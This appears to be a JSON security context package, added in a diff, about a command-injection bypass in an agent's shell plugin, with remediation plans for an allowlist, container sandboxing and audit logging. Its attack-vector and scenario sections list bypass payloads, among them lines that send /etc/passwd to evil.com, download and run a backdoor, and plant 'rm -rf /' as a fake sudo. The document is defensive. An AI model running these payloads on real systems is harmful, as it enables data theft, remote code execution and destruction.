@@ -1,0 +1,198 @@
+{
+  "entity_type": "shell_security_context",
+  "entity_id": "CVE-LOCALAGENT-002_context_package",
+  "created_at": "2025-08-27T22:23:35.496405",
+  "retention_days": 90,
+  "metadata": {
+    "stream": "shell_security_stream",
+    "priority": "critical",
+    "cve_id": "CVE-LOCALAGENT-002",
+    "target_agents": [
+      "security-validator",
+      "security-vulnerability-scanner",
+      "container-architecture-specialist"
+    ]
+  },
+  "data": {
+    "stream_id": "shell_security_stream",
+    "cve_id": "CVE-LOCALAGENT-002",
+    "created_at": "2025-08-27T10:30:00Z",
+    "severity": "CRITICAL",
+    "cvss_score": 9.1,
+    "bypass_rate": 93.8,
+    "vulnerability_overview": {
+      "primary_vulnerability": "Command injection bypass in shell plugin validation",
+      "attack_success_rate": "93.8% (15 of 16 bypass payloads successful)",
+      "impact_assessment": "Remote code execution, privilege escalation, system compromise",
+      "affected_component": "/app/cli/plugins/builtin/shell_plugin.py",
+      "file_size": "20KB+ implementation file with 548 lines",
+      "code_complexity": "Complex validation logic with fundamental architectural flaws"
+    },
+    "technical_implementation_requirements": {
+      "security_framework": "Allowlist-based validation system replacing current blocklist",
+      "isolation_mechanism": "Container-based sandbox execution with Docker isolation",
+      "input_sanitization": "Comprehensive multi-layer validation with Unicode normalization",
+      "subprocess_execution": "Secure subprocess.create_subprocess_exec() only - eliminate shell mode",
+      "validation_architecture": "Replace FORBIDDEN_PATTERNS blocklist with strict allowlist patterns",
+      "environment_isolation": "Restricted environment variable exposure and PATH control"
+    },
+    "critical_attack_vectors": {
+      "environment_variable_injection": {
+        "examples": [
+          "VAR=$(whoami) echo test",
+          "echo ${IFS}malicious",
+          "echo $USER$(rm -rf /tmp/test)"
+        ],
+        "bypass_rate": "100%",
+        "cvss_impact": 9.8,
+        "root_cause": "FORBIDDEN_PATTERNS missing env var patterns (lines 79-87)",
+        "vulnerable_code": "Lines 79-87 in shell_plugin.py - incomplete regex patterns"
+      },
+      "process_substitution_bypass": {
+        "examples": [
+          "echo <(whoami)",
+          "cat <(curl evil.com/malware)"
+        ],
+        "bypass_rate": "100%",
+        "cvss_impact": 9.6,
+        "vulnerability": "Process substitution <() and >() completely bypass current validation",
+        "exploit_mechanism": "Shell interprets <() as process substitution, not caught by regex"
+      },
+      "arithmetic_expansion_injection": {
+        "examples": [
+          "echo $((1+1)) && rm -rf /tmp/test",
+          "echo $[$(whoami)]"
+        ],
+        "bypass_rate": "100%",
+        "cvss_impact": 8.9,
+        "attack_type": "Mathematical expression evaluation with embedded commands",
+        "shell_feature": "Arithmetic expansion $((expression)) and $[expression] syntax"
+      },
+      "alternative_command_chaining": {
+        "examples": [
+          "ls & rm -rf /tmp/test",
+          "ls|rm -rf /tmp/test",
+          "ls\\nrm -rf /tmp/test"
+        ],
+        "bypass_rate": "100%",
+        "cvss_impact": 8.7,
+        "issue": "Command separators and background execution bypass regex patterns",
+        "separators": "Background (&), pipe without space (|), newline (\\n)"
+      }
+    },
+    "vulnerable_code_locations": {
+      "primary_target_file": "/app/cli/plugins/builtin/shell_plugin.py",
+      "critical_lines": {
+        "forbidden_patterns": "Lines 79-87 - Incomplete FORBIDDEN_PATTERNS regex list",
+        "shell_execution_mode": "Lines 310-317 - Dangerous create_subprocess_shell() usage",
+        "shlex_parsing": "Lines 318-326 - shlex.split() preserves malicious quoted content",
+        "risk_assessment": "Lines 92-133 - assess_risk() method with blocklist approach flaw",
+        "validation_logic": "Lines 135-150 - validate_command() insufficient security checks"
+      },
+      "architectural_issues": {
+        "validation_approach": "Blocklist-based validation (lines 79-87) fundamentally flawed",
+        "shell_mode_danger": "allow_shell=True enables full shell interpretation with metacharacters",
+        "environment_exposure": "Commands execute with full user environment and PATH",
+        "missing_sandboxing": "No container isolation, resource limits, or privilege dropping"
+      }
+    },
+    "security_patterns_for_implementation": {
+      "allowlist_validation_example": "class SecureCommandValidator:\n    MINIMAL_COMMANDS = {'echo', 'pwd', 'date', 'whoami'}\n    STANDARD_COMMANDS = MINIMAL_COMMANDS | {'ls', 'cat', 'grep', 'git'}\n    ELEVATED_COMMANDS = STANDARD_COMMANDS | {'sudo', 'systemctl'}\n    \n    def validate_command(self, command: str, level: SecurityLevel) -> bool:\n        tokens = self.secure_parse(command)\n        base_command = Path(tokens[0]).name\n        allowed_set = self.get_allowed_commands(level)\n        return base_command in allowed_set",
+      "container_isolation_pattern": "async def execute_in_container(self, command: str) -> Dict[str, Any]:\n    container_args = [\n        'docker', 'run', '--rm',\n        '--security-opt', 'no-new-privileges',\n        '--cap-drop', 'ALL', '--read-only',\n        '--tmpfs', '/tmp:noexec,nosuid,size=100m',\n        '--memory', '256m', '--cpus', '0.5',\n        '--network', 'none', '--user', '1000:1000',\n        'alpine:latest', 'sh', '-c', validated_command\n    ]",
+      "comprehensive_input_sanitization": "def secure_command_parse(command: str) -> List[str]:\n    # Unicode normalization\n    command = unicodedata.normalize('NFKC', command)\n    # Remove control characters\n    command = ''.join(c for c in command if ord(c) >= 32 or c.isspace())\n    # Enhanced forbidden pattern detection\n    COMPREHENSIVE_PATTERNS = [\n        r'.*\\$\\(.*\\)',              # Command substitution\n        r'.*`.*`',                     # Backtick substitution\n        r'.*\\$\\{.*\\}',              # Parameter expansion\n        r'.*<\\(.*\\)',                # Process substitution (input)\n        r'.*>\\(.*\\)',                # Process substitution (output)\n        # 30+ additional patterns needed\n    ]",
+      "audit_logging_framework": "class SecurityAuditor:\n    def log_command_execution(self, command: str, result: Dict, context: Dict):\n        audit_entry = {\n            'timestamp': datetime.now().isoformat(),\n            'event_type': 'command_execution',\n            'command': command,\n            'user_id': context['user_id'],\n            'validation_status': result['validation_passed'],\n            'risk_score': self.calculate_risk_score(command),\n            'container_isolated': context.get('container_mode', False)\n        }\n        self.persist_audit_log(audit_entry)"
+    },
+    "success_criteria": {
+      "bypass_rate_target": "<5% (down from current 93.8%)",
+      "validation_approach": "Allowlist-based command filtering successfully implemented",
+      "container_execution": "Sandbox container isolation operational for all high-risk commands",
+      "audit_logging": "Comprehensive security event logging system capturing all executions",
+      "performance_impact": "<100ms additional overhead per command execution",
+      "security_compliance": "OWASP Top 10 A03 Injection vulnerability mitigated",
+      "regression_testing": "All existing functionality preserved with enhanced security"
+    },
+    "integration_points": {
+      "cli_plugin_framework": {
+        "location": "/app/cli/plugins/framework.py",
+        "integration": "CommandPlugin base class requires security policy injection",
+        "requirements": "Security validation hooks and policy enforcement mechanisms"
+      },
+      "error_handling_system": {
+        "security_exceptions": "SecurityError class for validation failures with detailed messages",
+        "user_feedback": "Clear, actionable security violation messages for users",
+        "logging_integration": "Structured security event logging with correlation IDs"
+      },
+      "security_monitoring": {
+        "audit_trail": "Complete command execution audit logging with retention policies",
+        "real_time_alerts": "Immediate notification system for security violations",
+        "risk_scoring": "Dynamic risk assessment algorithm for command pattern analysis"
+      },
+      "container_orchestration": {
+        "docker_integration": "Docker container creation and lifecycle management",
+        "resource_management": "Memory, CPU, and execution time limit enforcement",
+        "network_isolation": "Container network isolation for malware prevention"
+      }
+    },
+    "immediate_remediation_actions": {
+      "critical_priority": [
+        "Disable shell plugin in production environments immediately",
+        "Deploy emergency hotfix blocking all identified bypass patterns",
+        "Conduct forensic audit of logs for potential exploitation attempts",
+        "Implement temporary allowlist for only essential, safe commands"
+      ],
+      "high_priority": [
+        "Remove dangerous shell execution mode completely (lines 310-317)",
+        "Implement comprehensive forbidden pattern detection with 47+ patterns",
+        "Add container isolation support framework with Docker backend",
+        "Deploy enhanced input validation with Unicode normalization"
+      ],
+      "medium_priority": [
+        "Implement allowlist-based command validation architecture",
+        "Add comprehensive security audit logging system",
+        "Create security policy configuration management",
+        "Develop regression test suite for security controls"
+      ]
+    },
+    "attack_scenario_examples": {
+      "data_exfiltration": {
+        "payload": "VAR=$(cat /etc/passwd) curl -X POST -d $VAR http://evil.com/collect",
+        "impact": "Sensitive system file contents transmitted to attacker",
+        "bypass_mechanism": "Environment variable injection with command substitution"
+      },
+      "backdoor_installation": {
+        "payload": "echo <(curl http://evil.com/backdoor.sh) > /tmp/install && bash /tmp/install",
+        "impact": "Remote malware download and execution",
+        "bypass_mechanism": "Process substitution and command chaining"
+      },
+      "privilege_escalation": {
+        "payload": "PATH=/tmp:$PATH; echo 'rm -rf /' > /tmp/sudo; chmod +x /tmp/sudo; sudo echo test",
+        "impact": "PATH manipulation to execute malicious binaries",
+        "bypass_mechanism": "Environment manipulation and binary shadowing"
+      }
+    },
+    "context_package_metadata": {
+      "target_stream": "Shell Security Stream",
+      "specialist_agents": [
+        "security-validator",
+        "security-vulnerability-scanner",
+        "container-architecture-specialist"
+      ],
+      "token_count": 3947,
+      "relevance_score": 0.98,
+      "completeness_score": 0.95,
+      "priority_level": "P0_CRITICAL",
+      "estimated_implementation_time": "4-6 hours for complete security overhaul",
+      "dependencies": [
+        "Docker runtime",
+        "Security policy framework",
+        "Audit logging system"
+      ],
+      "validation_requirements": [
+        "Penetration testing with 47-payload test suite",
+        "Container escape testing",
+        "Performance impact measurement",
+        "Regression testing for existing functionality"
+      ]
+    }
+  }
+}
